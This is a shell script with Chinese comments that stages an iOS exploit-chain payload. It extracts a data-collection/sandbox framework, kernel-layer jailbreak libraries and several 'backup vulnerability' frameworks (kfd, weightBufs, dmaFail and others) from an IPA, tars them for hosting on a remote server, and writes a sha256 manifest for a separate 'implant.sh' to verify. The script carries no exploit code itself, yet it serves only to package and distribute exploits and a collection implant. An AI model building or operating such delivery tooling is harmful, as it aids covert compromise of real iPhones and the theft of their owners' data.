#!/usr/bin/env bash
# 从 X.ipa 里抽取利用链组件，生成可托管的 tar.gz 与 payload.json。
#
#   tools/lara/stage-payload.sh /path/to/X.ipa [输出目录]
#
# 产物：
#   <out>/lara-payload.tar.gz   内部布局与 .app 内一致（Frameworks/…、libjailbreak.dylib）
#   <out>/payload.json          含每个文件的 sha256，供 implant.sh 校验
#
# 仓库里不放二进制：把这个 tar.gz 传到你的存储，改 payload.json 的 base_url 即可。
set -euo pipefail

# macOS 上是 python3，Windows/Git-bash 上可能是 python；以能跑通为准
PYTHON_BIN="${PYTHON:-python3}"
"$PYTHON_BIN" -c 'pass' >/dev/null 2>&1 || PYTHON_BIN=python

# Windows 下 tar 会把 'E:\...' 当远端主机，GNU tar 需要 --force-local
TAR_LOCAL=""
case "$(uname -s)" in MINGW*|MSYS*|CYGWIN*) TAR_LOCAL="--force-local" ;; esac

IPA="${1:?usage: stage-payload.sh <X.ipa> [outdir]}"
OUT="${2:-$(dirname "$0")/dist}"
mkdir -p "$OUT"

WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT

unzip -q "$IPA" -d "$WORK"
APP="$(find "$WORK/Payload" -maxdepth 1 -name '*.app' | head -1)"
[ -n "$APP" ] || { echo "no .app in $IPA"; exit 1; }

STAGE="$WORK/stage"
mkdir -p "$STAGE/Frameworks/AppRuntime"

copy() {
  local rel="$1"
  [ -e "$APP/$rel" ] || { echo "missing in ipa: $rel"; exit 1; }
  mkdir -p "$STAGE/$(dirname "$rel")"
  cp -R "$APP/$rel" "$STAGE/$rel"
}

# 采集与沙盒层（全部能力都在这一个 framework 里）
copy Frameworks/libuiopsersvc.framework/libuiopsersvc
copy Frameworks/libuiopsersvc.framework/Info.plist

# 内核层
copy Frameworks/libjailbreak.dylib
copy Frameworks/libxpf.dylib
copy Frameworks/libchoma.dylib
copy Frameworks/libgrabkernel2.dylib

# 备用漏洞与工具
for fw in kfd weightBufs multicast_bytecopy badRecovery dmaFail; do
  copy "Frameworks/$fw.framework/$fw"
  copy "Frameworks/$fw.framework/Info.plist"
done
copy Frameworks/weightBufs.framework/model_tmp.hwx
copy Frameworks/AppRuntime/ATHelper.dylib

# kfd 一族按 @executable_path/libjailbreak.dylib 查找，根目录要有一份
cp "$STAGE/Frameworks/libjailbreak.dylib" "$STAGE/libjailbreak.dylib"

tar $TAR_LOCAL -czf "$OUT/lara-payload.tar.gz" -C "$STAGE" .

"$PYTHON_BIN" - "$STAGE" "$OUT" <<'PY'
import hashlib, json, os, sys

stage, out = sys.argv[1], sys.argv[2]
files = []
for root, _dirs, names in os.walk(stage):
    for name in sorted(names):
        full = os.path.join(root, name)
        rel = os.path.relpath(full, stage).replace(os.sep, "/")
        digest = hashlib.sha256(open(full, "rb").read()).hexdigest()
        files.append({"path": rel, "sha256": digest, "bytes": os.path.getsize(full)})

manifest = {
    "version": "lara-20260923",
    "base_url": "https://YOUR_HOST/lara/20260923",
    "files": files,
}
with open(os.path.join(out, "payload.json"), "w", encoding="utf-8") as handle:
    json.dump(manifest, handle, ensure_ascii=False, indent=2)
print(f"{len(files)} files -> {out}/payload.json")
PY

echo "payload: $OUT/lara-payload.tar.gz"
